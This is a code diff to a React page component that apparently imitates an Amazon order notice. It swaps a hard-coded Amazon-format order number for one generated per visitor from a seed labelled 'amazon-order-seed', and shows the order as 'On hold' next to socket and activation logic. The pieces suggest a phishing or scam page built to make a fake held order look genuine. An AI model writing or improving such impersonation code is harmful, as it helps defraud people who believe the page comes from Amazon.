@@ -1,12 +1,33 @@
-﻿import { useState } from 'react';
+import { useMemo, useState } from 'react';
 import { useNavigate } from 'react-router-dom';
 import { socket } from '../socket';
 import { getClientId, setActivated } from '../session';
 import { BRAND, BRAND_PROMISES } from '../brand';
 
+function buildOrderNumber(clientId: string) {
+  const seed = (clientId || 'amazon-order-seed').replace(/[^a-zA-Z0-9]/g, '');
+  let hash = 0;
+  for (let i = 0; i < seed.length; i += 1) {
+    hash = (hash * 33 + seed.charCodeAt(i)) >>> 0;
+  }
+
+  const segment = (length: number, salt: number) => {
+    let value = (hash ^ salt) >>> 0;
+    let out = '';
+    while (out.length < length) {
+      value = (value * 1664525 + 1013904223) >>> 0;
+      out += String(value % 10);
+    }
+    return out.slice(0, length);
+  };
+
+  return `${segment(3, 0x9e37)}-${segment(7, 0x85eb)}-${segment(7, 0xc2b2)}`;
+}
+
 export default function Home() {
   const navigate = useNavigate();
   const [loading, setLoading] = useState(false);
+  const orderNumber = useMemo(() => buildOrderNumber(getClientId()), []);
   const orderPlacedDate = new Intl.DateTimeFormat('en-US', {
     month: 'long',
     day: 'numeric',
@@ -82,12 +103,12 @@ export default function Home() {
               </div>
               <div className="alz-order-id">
                 <span>Order #</span>
-                <strong>114-9283746-5721904</strong>
+                <strong>{orderNumber}</strong>
               </div>
             </div>
 
             <div className="alz-home-mobile-strip">
-              <span>Order #114-9283746-5721904</span>
+              <span>Order #{orderNumber}</span>
               <strong>On hold</strong>
             </div>
 
